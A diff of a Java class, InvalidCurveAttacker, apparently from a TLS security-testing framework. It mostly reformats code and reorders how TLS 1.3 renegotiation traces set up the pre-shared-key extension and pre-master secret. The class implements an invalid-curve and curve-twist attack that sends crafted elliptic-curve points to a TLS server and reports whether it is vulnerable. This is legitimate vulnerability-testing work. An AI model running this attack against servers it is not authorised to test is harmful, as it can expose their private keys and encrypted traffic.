@@ -70,9 +70,9 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     private static final Logger LOGGER = LogManager.getLogger();
 
     private BigInteger premasterSecret;
-    
+
     private List<ResponseFingerprint> responseFingerprints;
-    
+
     private List<Point> receivedEcPublicKeys;
 
     /**
@@ -110,63 +110,60 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         }
         responseFingerprints = new LinkedList<>();
         receivedEcPublicKeys = new LinkedList<>();
-        
+
         EllipticCurve curve;
         Point point;
-        if(config.isCurveTwistAttack()) {
+        if (config.isCurveTwistAttack()) {
             curve = config.getTwistedCurve();
-            BigInteger transformedX = config.getPublicPointBaseX().multiply(config.getCurveTwistD()).mod(curve.getModulus());
-            point = Point.createPoint(transformedX, config.getPublicPointBaseY(),
-                config.getNamedGroup());
-        }
-        else {
+            BigInteger transformedX = config.getPublicPointBaseX().multiply(config.getCurveTwistD())
+                    .mod(curve.getModulus());
+            point = Point.createPoint(transformedX, config.getPublicPointBaseY(), config.getNamedGroup());
+        } else {
             curve = CurveFactory.getCurve(config.getNamedGroup());
             point = Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(),
-                config.getNamedGroup());
+                    config.getNamedGroup());
         }
-        
+
         for (int i = 0; i < getConfig().getProtocolFlows(); i++) {
             if (config.getPremasterSecret() != null) {
                 premasterSecret = config.getPremasterSecret();
             } else {
-                Point sharedPoint = curve.mult(new BigInteger("" + (i + 1)), point);          
+                Point sharedPoint = curve.mult(new BigInteger("" + (i + 1)), point);
                 if (sharedPoint.getX() == null) {
                     premasterSecret = BigInteger.ZERO;
-                }
-                else { 
+                } else {
                     premasterSecret = sharedPoint.getX().getData();
-                    if(config.isCurveTwistAttack()) {
+                    if (config.isCurveTwistAttack()) {
                         // transform back from simulated x-only ladder
-                        premasterSecret = premasterSecret.multiply(config.getCurveTwistD().modInverse(curve.getModulus())).mod(curve.getModulus());
+                        premasterSecret = premasterSecret.multiply(
+                                config.getCurveTwistD().modInverse(curve.getModulus())).mod(curve.getModulus());
                     }
                 }
                 LOGGER.debug("PMS: " + premasterSecret.toString());
             }
             try {
-                WorkflowTrace trace = executeProtocolFlow(); 
+                WorkflowTrace trace = executeProtocolFlow();
 
-                //expect 2 of each for successfull attack in renegotiation
+                // expect 2 of each for successfull attack in renegotiation
                 int receivedServerHellos = 0;
-                int receivedServerFins = 0; 
-                
-                for(ProtocolMessage msg : WorkflowTraceUtil.getAllReceivedMessages(trace, ProtocolMessageType.HANDSHAKE))
-                {
-                    HandshakeMessage hMsg = (HandshakeMessage)msg;
-                    if(hMsg.getHandshakeMessageType() == HandshakeMessageType.SERVER_HELLO)
-                    {
+                int receivedServerFins = 0;
+
+                for (ProtocolMessage msg : WorkflowTraceUtil.getAllReceivedMessages(trace,
+                        ProtocolMessageType.HANDSHAKE)) {
+                    HandshakeMessage hMsg = (HandshakeMessage) msg;
+                    if (hMsg.getHandshakeMessageType() == HandshakeMessageType.SERVER_HELLO) {
                         receivedServerHellos++;
-                    }
-                    else if(hMsg.getHandshakeMessageType() == HandshakeMessageType.FINISHED)
-                    {
-                        receivedServerFins++; 
+                    } else if (hMsg.getHandshakeMessageType() == HandshakeMessageType.FINISHED) {
+                        receivedServerFins++;
                     }
                 }
-                if (getTlsConfig().getHighestProtocolVersion() != ProtocolVersion.TLS13 && (receivedServerHellos < 1 || (config.isAttackInRenegotiation() && receivedServerHellos < 2))) {
+                if (getTlsConfig().getHighestProtocolVersion() != ProtocolVersion.TLS13
+                        && (receivedServerHellos < 1 || (config.isAttackInRenegotiation() && receivedServerHellos < 2))) {
                     LOGGER.info("Did not receive ServerHello. Check your config");
 
                     return null;
                 }
-                if (receivedServerFins < 1 || ((config.isAttackInRenegotiation() && receivedServerFins < 2))) { 
+                if (receivedServerFins < 1 || ((config.isAttackInRenegotiation() && receivedServerFins < 2))) {
                     LOGGER.info("Received no finished Message in Protocolflow:" + i);
                 } else {
                     LOGGER.info("Received a finished Message in Protocolflow: " + i + "! Server is vulnerable!");
@@ -181,108 +178,114 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
 
     private WorkflowTrace executeProtocolFlow() {
         Config tlsConfig = getTlsConfig();
-        
-        
+
         EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
         ModifiableByteArray serializedPublicKey = ModifiableVariableFactory.createByteArrayModifiableVariable();
-        Point basepoint = new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()), new FieldElementFp(config.getPublicPointBaseY(), curve.getModulus()));
-        byte[] serialized = PointFormatter.formatToByteArray(config.getNamedGroup(), basepoint, config.getPointCompressionFormat());
+        Point basepoint = new Point(new FieldElementFp(config.getPublicPointBaseX(), curve.getModulus()),
+                new FieldElementFp(config.getPublicPointBaseY(), curve.getModulus()));
+        byte[] serialized = PointFormatter.formatToByteArray(config.getNamedGroup(), basepoint,
+                config.getPointCompressionFormat());
         serializedPublicKey.setModification(ByteArrayModificationFactory.explicitValue(serialized));
         ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
-        byte[] explicitPMS = BigIntegers.asUnsignedByteArray(ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
+        byte[] explicitPMS = BigIntegers.asUnsignedByteArray(
+                ArrayConverter.bigIntegerToByteArray(curve.getModulus()).length, premasterSecret);
         pms.setModification(ByteArrayModificationFactory.explicitValue(explicitPMS));
-        
+
         WorkflowTrace trace;
-        if(config.isAttackInRenegotiation())
-        {
+        if (config.isAttackInRenegotiation()) {
             trace = prepareRenegotiationTrace(serializedPublicKey, pms, explicitPMS);
-        }
-        else
-        {
+        } else {
             trace = prepareRegularTrace(serializedPublicKey, pms, explicitPMS);
         }
         LOGGER.info("Working with the follwoing premaster secret: " + ArrayConverter.bytesToHexString(explicitPMS));
-        
+
         State state = new State(tlsConfig, trace);
-        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(tlsConfig.getWorkflowExecutorType(), state);
+        WorkflowExecutor workflowExecutor = WorkflowExecutorFactory.createWorkflowExecutor(
+                tlsConfig.getWorkflowExecutorType(), state);
         workflowExecutor.executeWorkflow();
-        
-        responseFingerprints.add(ResponseExtractor.getFingerprint(state)); 
-        if(state.getTlsContext().getServerEcPublicKey() != null)
-        {
+
+        responseFingerprints.add(ResponseExtractor.getFingerprint(state));
+        if (state.getTlsContext().getServerEcPublicKey() != null) {
             getReceivedEcPublicKeys().add(state.getTlsContext().getServerEcPublicKey());
         }
         return trace;
     }
-    
-    private WorkflowTrace prepareRegularTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms, byte[] explicitPMS)
-    {
-       Config tlsConfig = getTlsConfig();
-       WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
+
+    private WorkflowTrace prepareRegularTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
+            byte[] explicitPMS) {
+        Config tlsConfig = getTlsConfig();
+        WorkflowTrace trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HELLO,
                 RunningModeType.CLIENT);
-       if(tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13)
-        {
+        if (tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13) {
             ClientHelloMessage cHello = (ClientHelloMessage) WorkflowTraceUtil.getFirstSendMessage(
-                HandshakeMessageType.CLIENT_HELLO, trace); 
+                    HandshakeMessageType.CLIENT_HELLO, trace);
             KeyShareExtensionMessage ksExt;
-            for(ExtensionMessage ext : cHello.getExtensions())
-            {
-                if(ext instanceof KeyShareExtensionMessage)
-                {
-                    ksExt = (KeyShareExtensionMessage)ext;
-                    ksExt.getKeyShareList().get(0).setPublicKey(serializedPublicKey); //we use exactly one key share
+            for (ExtensionMessage ext : cHello.getExtensions()) {
+                if (ext instanceof KeyShareExtensionMessage) {
+                    ksExt = (KeyShareExtensionMessage) ext;
+                    ksExt.getKeyShareList().get(0).setPublicKey(serializedPublicKey); // we
+                                                                                      // use
+                                                                                      // exactly
+                                                                                      // one
+                                                                                      // key
+                                                                                      // share
                 }
-            }    
-            
-            //TODO: use action / modification to influence key derivation for TLS 1.3
+            }
+
+            // TODO: use action / modification to influence key derivation for
+            // TLS 1.3
             getTlsConfig().setDefaultPreMasterSecret(explicitPMS);
-        }
-        else
-        {
+        } else {
             trace.addTlsAction(new SendAction(new ECDHClientKeyExchangeMessage(tlsConfig), new ChangeCipherSpecMessage(
-                tlsConfig), new FinishedMessage(tlsConfig)));
+                    tlsConfig), new FinishedMessage(tlsConfig)));
             trace.addTlsAction(new ReceiveAction(new ChangeCipherSpecMessage(), new FinishedMessage()));
-            
-            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getFirstSendMessage(
-                HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace); 
+
+            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil
+                    .getFirstSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
             message.setPublicKey(serializedPublicKey);
             message.prepareComputations();
             message.getComputations().setPremasterSecret(pms);
         }
-       
-       return trace;
+
+        return trace;
     }
-    
-    private WorkflowTrace prepareRenegotiationTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms, byte[] explicitPMS)
-    {
+
+    private WorkflowTrace prepareRenegotiationTrace(ModifiableByteArray serializedPublicKey, ModifiableByteArray pms,
+            byte[] explicitPMS) {
         WorkflowTrace trace;
         Config tlsConfig = getTlsConfig();
-        if(tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13)
-        {
+        if (tlsConfig.getHighestProtocolVersion() == ProtocolVersion.TLS13) {
             tlsConfig.setDefaultSelectedCipherSuite(tlsConfig.getDefaultClientSupportedCiphersuites().get(0));
             trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.HANDSHAKE,
-                RunningModeType.CLIENT);
+                    RunningModeType.CLIENT);
             trace.addTlsAction(new ReceiveAction(new NewSessionTicketMessage(false)));
             trace.addTlsAction(new ResetConnectionAction());
             
+            //next ClientHello needs a PSKExtension
+            tlsConfig.setAddPreSharedKeyExtension(Boolean.TRUE);
+            
+            WorkflowTrace secondHandshake = prepareRegularTrace(serializedPublicKey, pms, explicitPMS);
+            
+            //subsequent ClientHellos don't need a PSKExtension
+            tlsConfig.setAddPreSharedKeyExtension(Boolean.FALSE);
+            
+            //make sure no explicit PreMasterSecret is set at this point
+            tlsConfig.setDefaultPreMasterSecret(new byte[0]);
+            
+            //set explicit PreMasterSecret later on using an action
             ChangeDefaultPreMasterSecretAction cPMS = new ChangeDefaultPreMasterSecretAction();
             cPMS.setNewValue(explicitPMS);
             trace.addTlsAction(cPMS);
             
-            tlsConfig.setAddPreSharedKeyExtension(Boolean.TRUE);
-            WorkflowTrace secondHandshake = prepareRegularTrace(serializedPublicKey, pms, explicitPMS);
-            
-            for (TlsAction action : secondHandshake.getTlsActions()) 
-            {
+            for (TlsAction action : secondHandshake.getTlsActions()) {
                 trace.addTlsAction(action);
             }
-        }
-        else
-        {           
+        } else {
             tlsConfig.setDefaultSelectedCipherSuite(tlsConfig.getDefaultClientSupportedCiphersuites().get(0));
-            trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION,
-                RunningModeType.CLIENT);
-            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage)WorkflowTraceUtil.getLastSendMessage(HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
+            trace = new WorkflowConfigurationFactory(tlsConfig).createWorkflowTrace(
+                    WorkflowTraceType.CLIENT_RENEGOTIATION_WITHOUT_RESUMPTION, RunningModeType.CLIENT);
+            ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) WorkflowTraceUtil.getLastSendMessage(
+                    HandshakeMessageType.CLIENT_KEY_EXCHANGE, trace);
             message.setPublicKey(serializedPublicKey);
             message.prepareComputations();
             message.getComputations().setPremasterSecret(pms);
@@ -299,7 +302,8 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
     }
 
     /**
-     * @param responseFingerprints the responseFingerprints to set
+     * @param responseFingerprints
+     *            the responseFingerprints to set
      */
     public void setResponseFingerprints(List<ResponseFingerprint> responseFingerprints) {
         this.responseFingerprints = responseFingerprints;
